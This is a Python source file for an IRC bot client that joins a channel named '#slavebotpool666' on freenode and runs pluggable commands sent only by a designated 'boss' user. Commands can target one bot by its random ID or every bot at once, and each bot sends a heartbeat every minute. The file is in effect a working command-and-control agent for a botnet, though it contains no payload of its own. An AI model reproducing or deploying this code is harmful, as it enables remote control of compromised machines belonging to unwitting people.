from typing import Any, List, Callable
from threading import Timer
import socket
import re
import secrets
import logging
import platform
import functools


RE_PARSE_PRIVMSG = r"^:(?P<owner>\w+)!.+PRIVMSG\s+#(?P<channel>\w+)\s+:\$(?P<commandstr>.+)"
RE_PARSE_COMMADSET = r"(?P<command>\w+)\s*(?P<args>.*)"

logging.basicConfig(level=logging.DEBUG)


def send_bytes(string: str, encoding: str = "utf-8") -> bytes:
    return bytes(string, encoding)


class RepeatedTimer(object):
    def __init__(self, interval, function, *args, **kwargs):
        self._timer = None
        self.interval = interval
        self.function = function
        self.args = args
        self.kwargs = kwargs
        self.is_running = False
        self.start()

    def _run(self):
        self.is_running = False
        self.start()
        self.function(*self.args, **self.kwargs)

    def start(self):
        if not self.is_running:
            self._timer = Timer(self.interval, self._run)
            self._timer.start()
            self.is_running = True

    def stop(self):
        self._timer.cancel()
        self.is_running = False


class Bot:
    sock: socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def __init__(self, host: str = "chat.freenode.net", port: int = 6667, channel: str = "#slavebotpool666", boss_name="bos666", bot_prefix: str = 'SLAVEBOT'):
        self.host = host
        self.port = port
        self.channel = channel
        self.boss_name = boss_name
        self.bot_prefix = bot_prefix
        self.bot_id = secrets.token_hex(3)
        self.bot_fullname = f"{self.bot_prefix}_{self.bot_id}"
        self.SERVER_STATUS = True
        self.COMMAND_SET = dict()
        self.ping_timer: RepeatedTimer = None

    def read_config_from_dict(self, config: dict) -> None:
        for key, value in config.items():
            setattr(self, key, value)

    def _revc(self, bufsize: int = 2024) -> str:
        return self.sock.recv(bufsize).decode("utf-8").strip('\n\r')

    def join_channel(self):
        self.sock.send(send_bytes(f"JOIN {self.channel}\n"))

    def send_text(self, text: str):
        for line in text.split('\n'):
            self.sock.send(send_bytes(f"PRIVMSG {self.channel} :{line}\n"))

    def pong(self):
        self.send_text("**Im alive**")

    def exit_server(self):
        self.sock.send(send_bytes("QUIT \n"))
        self.sock.close()
        self.ping_timer.stop()
        self.SERVER_STATUS = False

    def execute(self, func_dict, args: List[str]):
        if func_dict['all'] and args[0] == '/all':
            func_dict['func'](bot=self, args=args)
        if self.bot_id == args[0]:
            func_dict['func'](bot=self, args=args)

    def parse_command(self, raw_data: bytes):
        msg_match = re.match(RE_PARSE_PRIVMSG, raw_data)
        if msg_match:
            owner = msg_match.group('owner')
            commandstr = msg_match.group('commandstr')
            if owner == self.boss_name:
                cmd_match = re.match(RE_PARSE_COMMADSET, commandstr)
                if cmd_match:
                    command = cmd_match.group('command')
                    args = cmd_match.group('args').split(' ')

                    st = self.COMMAND_SET.get(command, None)
                    if st is not None:
                        self.execute(st, args)
                    else:
                        self.send_text(f"Command not found")
                        logging.error("Commmand not found")
                else:
                    logging.error("Regex error - cmd_parser")
            else:
                #logging.error("Regex error - privmsg")
                pass

    def listen_forever(self) -> None:
        while self.SERVER_STATUS:
            raw_data = self._revc()
            logging.debug(raw_data)
            self.parse_command(raw_data)

    def connect(self) -> None:
        self.sock.connect((self.host, self.port))
        self.sock.send(send_bytes(
            f"USER {self.bot_fullname} {self.bot_fullname} {self.bot_fullname} {self.bot_fullname}\n"))
        self.sock.send(send_bytes(f"NICK {self.bot_fullname}\n"))
        self.join_channel()
        logging.debug(f"Connected {self.host}")

    def send_command_help(self) -> None:
        for cmdstr, cmd_stuff in self.COMMAND_SET.items():
            self.send_text(f"{cmdstr}: {cmd_stuff['help_text']}")

    def connected_afer(self):
        self.send_command_help()
        for cmdstr, cmd_stuff in self.COMMAND_SET.items():
            if cmd_stuff['on_connect'] == True:
                cmd_stuff['func'](bot=self)

        self.ping_timer = RepeatedTimer(60, self.pong)

    def start(self):
        self.connect()
        self.connected_afer()
        self.listen_forever()

    def register(self, cmdstr, all=False, on_connect=False, help_text="No description given"):
        def wrap_register(func):
            self.COMMAND_SET[cmdstr] = {
                'all': all, 'on_connect': on_connect, 'help_text': help_text, 'func': func}
            return func
        return wrap_register
